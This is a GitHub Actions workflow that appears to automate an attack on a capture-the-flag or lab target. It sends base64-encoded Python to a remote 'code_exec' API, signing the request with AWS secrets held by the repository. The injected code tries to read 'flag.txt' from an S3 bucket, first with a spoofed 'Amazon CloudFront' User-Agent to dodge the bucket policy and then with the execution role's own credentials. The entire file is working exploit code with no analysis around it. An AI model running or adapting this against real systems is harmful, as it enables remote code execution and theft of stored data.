name: Stage2-CodeExec-S3-Test

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1

    steps:
      - name: Test Stage 2 code_exec S3 access
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import json
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

          inner = r'''
          import time
          import urllib.request
          import boto3
          from botocore.config import Config

          bucket = "userad88e2b168aa387e"
          key = "flag.txt"
          success = False

          try:
              url = (
                  "https://s3.us-east-1.amazonaws.com/"
                  + bucket
                  + "/"
                  + key
              )

              request = urllib.request.Request(
                  url,
                  headers={"User-Agent": "Amazon CloudFront"}
              )

              with urllib.request.urlopen(request, timeout=10) as response:
                  data = response.read()

              print("UNSIGNED_READ_SUCCESS")
              print("BYTES=" + str(len(data)))
              success = True

          except Exception as unsigned_error:
              print("UNSIGNED_READ_FAILED")
              print(repr(unsigned_error))

          if not success:
              try:
                  client = boto3.client(
                      "s3",
                      region_name="us-east-1",
                      endpoint_url="https://s3.us-east-1.amazonaws.com",
                      config=Config(signature_version="s3v4")
                  )

                  result = client.get_object(
                      Bucket=bucket,
                      Key=key
                  )

                  data = result["Body"].read()

                  print("SIGNED_READ_SUCCESS")
                  print("BYTES=" + str(len(data)))
                  success = True

              except Exception as signed_error:
                  print("SIGNED_READ_FAILED")
                  print(repr(signed_error))

          if success:
              time.sleep(5)
          '''

          encoded = base64.b64encode(inner.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          started = time.monotonic()

          response = requests.post(
              API,
              json={"code": encoded},
              auth=auth,
              timeout=25
          )

          elapsed = time.monotonic() - started

          print("HTTP=" + str(response.status_code))
          print("ELAPSED=%.2f" % elapsed)
          print(response.text)
          PY
